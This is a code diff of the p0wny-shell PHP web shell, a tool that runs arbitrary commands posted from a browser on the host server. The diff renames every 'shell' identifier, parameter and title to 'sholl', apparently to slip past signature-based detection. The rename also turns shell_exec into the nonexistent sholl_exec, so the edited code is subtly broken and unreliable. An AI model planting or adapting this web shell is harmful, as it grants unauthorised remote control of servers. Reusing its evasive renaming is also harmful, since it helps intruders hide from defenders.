@@ -1,6 +1,6 @@
 <?php
 
-function featureShell($cmd, $cwd) {
+function featuresholl($cmd, $cwd) {
     $stdout = array();
 
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
@@ -36,7 +36,7 @@ function featureHint($fileName, $cwd, $type) {
         $cmd = "compgen -f $fileName";
     }
     $cmd = "/bin/bash -c \"$cmd\"";
-    $files = explode("\n", shell_exec($cmd));
+    $files = explode("\n", sholl_exec($cmd));
     return array(
         'files' => $files,
     );
@@ -80,12 +80,12 @@ if (isset($_GET["feature"])) {
     $response = NULL;
 
     switch ($_GET["feature"]) {
-        case "shell":
+        case "sholl":
             $cmd = $_POST['cmd'];
             if (!preg_match('/2>/', $cmd)) {
                 $cmd .= ' 2>&1';
             }
-            $response = featureShell($cmd, $_POST["cwd"]);
+            $response = featuresholl($cmd, $_POST["cwd"]);
             break;
         case "pwd":
             $response = featurePwd();
@@ -108,7 +108,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>p0wny@shell:~#</title>
+        <title>p0wny@sholl:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -135,7 +135,7 @@ if (isset($_GET["feature"])) {
                 background-color: #bcbcbc;
             }
 
-            #shell {
+            #sholl {
                 background: #222;
                 max-width: 800px;
                 margin: 50px auto 0 auto;
@@ -146,7 +146,7 @@ if (isset($_GET["feature"])) {
                 align-items: stretch;
             }
 
-            #shell-content {
+            #sholl-content {
                 height: 500px;
                 overflow: auto;
                 padding: 5px;
@@ -154,57 +154,57 @@ if (isset($_GET["feature"])) {
                 flex-grow: 1;
             }
 
-            #shell-logo {
+            #sholl-logo {
                 font-weight: bold;
                 color: #FF4180;
                 text-align: center;
             }
 
             @media (max-width: 991px) {
-                #shell-logo {
+                #sholl-logo {
                     font-size: 6px;
                     margin: -25px 0;
                 }
 
-                html, body, #shell {
+                html, body, #sholl {
                     height: 100%;
                     width: 100%;
                     max-width: none;
                 }
 
-                #shell {
+                #sholl {
                     margin-top: 0;
                 }
             }
 
             @media (max-width: 767px) {
-                #shell-input {
+                #sholl-input {
                     flex-direction: column;
                 }
             }
 
             @media (max-width: 320px) {
-                #shell-logo {
+                #sholl-logo {
                     font-size: 5px;
                 }
             }
 
-            .shell-prompt {
+            .sholl-prompt {
                 font-weight: bold;
                 color: #75DF0B;
             }
 
-            .shell-prompt > span {
+            .sholl-prompt > span {
                 color: #1BC9E7;
             }
 
-            #shell-input {
+            #sholl-input {
                 display: flex;
                 box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                 border-top: rgba(255, 255, 255, .05) solid 1px;
             }
 
-            #shell-input > label {
+            #sholl-input > label {
                 flex-grow: 0;
                 display: block;
                 padding: 0 5px;
@@ -212,7 +212,7 @@ if (isset($_GET["feature"])) {
                 line-height: 30px;
             }
 
-            #shell-input #shell-cmd {
+            #sholl-input #sholl-cmd {
                 height: 30px;
                 line-height: 30px;
                 border: none;
@@ -224,12 +224,12 @@ if (isset($_GET["feature"])) {
                 align-self: center;
             }
 
-            #shell-input div {
+            #sholl-input div {
                 flex-grow: 1;
                 align-items: stretch;
             }
 
-            #shell-input input {
+            #sholl-input input {
                 outline: none;
             }
         </style>
@@ -238,36 +238,36 @@ if (isset($_GET["feature"])) {
             var CWD = null;
             var commandHistory = [];
             var historyPosition = 0;
-            var eShellCmdInput = null;
-            var eShellContent = null;
+            var eshollCmdInput = null;
+            var eshollContent = null;
 
             function _insertCommand(command) {
-                eShellContent.innerHTML += "\n\n";
-                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
-                eShellContent.innerHTML += escapeHtml(command);
-                eShellContent.innerHTML += "\n";
-                eShellContent.scrollTop = eShellContent.scrollHeight;
+                eshollContent.innerHTML += "\n\n";
+                eshollContent.innerHTML += '<span class=\"sholl-prompt\">' + genPrompt(CWD) + '</span> ';
+                eshollContent.innerHTML += escapeHtml(command);
+                eshollContent.innerHTML += "\n";
+                eshollContent.scrollTop = eshollContent.scrollHeight;
             }
 
             function _insertStdout(stdout) {
-                eShellContent.innerHTML += escapeHtml(stdout);
-                eShellContent.scrollTop = eShellContent.scrollHeight;
+                eshollContent.innerHTML += escapeHtml(stdout);
+                eshollContent.scrollTop = eshollContent.scrollHeight;
             }
 
             function _defer(callback) {
                 setTimeout(callback, 0);
             }
 
-            function featureShell(command) {
+            function featuresholl(command) {
 
                 _insertCommand(command);
                 if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                     featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                 } else if (/^\s*clear\s*$/.test(command)) {
-                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
-                    eShellContent.innerHTML = '';
+                    // Backend sholl TERM environment variable not set. Clear command history from UI but keep in buffer
+                    eshollContent.innerHTML = '';
                 } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                    makeRequest("?feature=sholl", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
@@ -279,25 +279,25 @@ if (isset($_GET["feature"])) {
             }
 
             function featureHint() {
-                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
+                if (eshollCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
 
                 function _requestCallback(data) {
                     if (data.files.length <= 1) return;  // no completion
 
                     if (data.files.length === 2) {
                         if (type === 'cmd') {
-                            eShellCmdInput.value = data.files[0];
+                            eshollCmdInput.value = data.files[0];
                         } else {
-                            var currentValue = eShellCmdInput.value;
-                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
+                            var currentValue = eshollCmdInput.value;
+                            eshollCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                         }
                     } else {
-                        _insertCommand(eShellCmdInput.value);
+                        _insertCommand(eshollCmdInput.value);
                         _insertStdout(data.files.join("\n"));
                     }
                 }
 
-                var currentCmd = eShellCmdInput.value.split(" ");
+                var currentCmd = eshollCmdInput.value.split(" ");
                 var type = (currentCmd.length === 1) ? "cmd" : "file";
                 var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
 
@@ -360,7 +360,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "p0wny@sholl:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -384,24 +384,24 @@ if (isset($_GET["feature"])) {
             }
 
             function _updatePrompt() {
-                var eShellPrompt = document.getElementById("shell-prompt");
-                eShellPrompt.innerHTML = genPrompt(CWD);
+                var eshollPrompt = document.getElementById("sholl-prompt");
+                eshollPrompt.innerHTML = genPrompt(CWD);
             }
 
-            function _onShellCmdKeyDown(event) {
+            function _onshollCmdKeyDown(event) {
                 switch (event.key) {
                     case "Enter":
-                        featureShell(eShellCmdInput.value);
-                        insertToHistory(eShellCmdInput.value);
-                        eShellCmdInput.value = "";
+                        featuresholl(eshollCmdInput.value);
+                        insertToHistory(eshollCmdInput.value);
+                        eshollCmdInput.value = "";
                         break;
                     case "ArrowUp":
                         if (historyPosition > 0) {
                             historyPosition--;
-                            eShellCmdInput.blur();
-                            eShellCmdInput.value = commandHistory[historyPosition];
+                            eshollCmdInput.blur();
+                            eshollCmdInput.value = commandHistory[historyPosition];
                             _defer(function() {
-                                eShellCmdInput.focus();
+                                eshollCmdInput.focus();
                             });
                         }
                         break;
@@ -411,11 +411,11 @@ if (isset($_GET["feature"])) {
                         }
                         historyPosition++;
                         if (historyPosition === commandHistory.length) {
-                            eShellCmdInput.value = "";
+                            eshollCmdInput.value = "";
                         } else {
-                            eShellCmdInput.blur();
-                            eShellCmdInput.focus();
-                            eShellCmdInput.value = commandHistory[historyPosition];
+                            eshollCmdInput.blur();
+                            eshollCmdInput.focus();
+                            eshollCmdInput.value = commandHistory[historyPosition];
                         }
                         break;
                     case 'Tab':
@@ -466,35 +466,34 @@ if (isset($_GET["feature"])) {
                 }
 
                 if (!selection.toString()) {
-                    eShellCmdInput.focus();
+                    eshollCmdInput.focus();
                 }
             };
 
             window.onload = function() {
-                eShellCmdInput = document.getElementById("shell-cmd");
-                eShellContent = document.getElementById("shell-content");
+                eshollCmdInput = document.getElementById("sholl-cmd");
+                eshollContent = document.getElementById("sholl-content");
                 updateCwd();
-                eShellCmdInput.focus();
+                eshollCmdInput.focus();
             };
         </script>
     </head>
 
     <body>
-        <div id="shell">
-            <pre id="shell-content">
-                <div id="shell-logo">
+        <div id="sholl">
+            <pre id="sholl-content">
+                <div id="sholl-logo">
         ___                         ____      _          _ _        _  _   <span></span>
  _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
 | '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
-| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
 | .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
 |_|                         |___/  \____/                                  <span></span>
                 </div>
             </pre>
-            <div id="shell-input">
-                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
+            <div id="sholl-input">
+                <label for="sholl-cmd" id="sholl-prompt" class="sholl-prompt">???</label>
                 <div>
-                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                    <input id="sholl-cmd" name="cmd" onkeydown="_onshollCmdKeyDown(event)"/>
                 </div>
             </div>
         </div>
